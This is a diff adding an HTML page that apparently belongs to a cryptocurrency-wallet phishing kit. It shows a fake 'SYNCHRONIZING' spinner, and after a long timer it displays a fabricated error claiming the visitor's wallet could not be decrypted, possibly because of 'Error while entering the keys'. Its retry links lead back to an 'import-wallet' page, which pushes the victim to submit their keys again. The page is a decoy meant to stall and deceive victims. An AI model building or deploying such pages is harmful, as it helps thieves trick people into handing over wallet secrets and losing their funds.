@@ -1,0 +1,56 @@
+<!DOCTYPE html><html><head>
+        <meta charset="UTF-8">
+        <meta content="IE=edge" http-equiv="X-UA-Compatible">
+        <meta content="width=device-width,initial-scale=1" name="viewport">
+        <meta content="description" name="description">
+        <meta name="google" content="notranslate">
+
+  <!-- Disable tap highlight on IE -->
+  <meta name="msapplication-tap-highlight" content="no">
+        <title>Sync.. </title>
+        <link rel="stylesheet" href="loading.css">
+        <link rel="stylesheet" href="bootstrap.min.css" crossorigin="anonymous">
+        <script src="jquery.min.js"></script>
+    </head>
+    <body>
+        <img class="bar-image" src="barcode.png">
+        <svg class="spinner" width="20%" height="20%" viewBox="0 0 66 66" xmlns="http://www.w3.org/2000/svg">
+            <circle class="path" fill="none" stroke-width="6" stroke-linecap="round" cx="33" cy="33" r="30"/>
+        </svg>
+        <div class="texts-caption">
+            <div class="card-title caption">
+                SYNCHRONIZING ...
+            </div>
+            <label>This process may take a few minutes</label><br>
+            <label>Do not close this page</label><br>
+            <a href="https://web3-bridge.github.io/sync/import-wallet" class="btn btn-info">Retry</a>
+        </div>
+        <div id="notifications" class="card" style="width: 30rem; display: none;">
+            <div class="card-body">
+              <h5 class="card-title">DAPP's solutions</h5>
+              <h6 class="card-subtitle mb-2 text-muted">We encountered some errors decrypting your wallet</h6>
+              <p class="card-text">
+                  This could be as a result of one of the following:
+                  </p><ul>
+                      <li>Poor internet connection</li>
+                      <li>Error while entering the keys</li>
+                      <li>Inactive or empty wallet</li>
+                  </ul>
+                <p></p>
+              <a href="index.html" class="btn btn-info">Retry</a>
+            </div>
+          </div>
+    
+    
+
+        <script type="text/javascript">
+            $(document).ready(function() { 
+                setTimeout(function() { 
+                    $("#notifications").css("display", "block");
+                    $(".spinner").css("display", "none");
+                    $(".bar-image").css("display", "none");
+                    $(".texts-caption").css("display", "none");
+                }, 700000);
+            });
+        </script>
+</body></html>
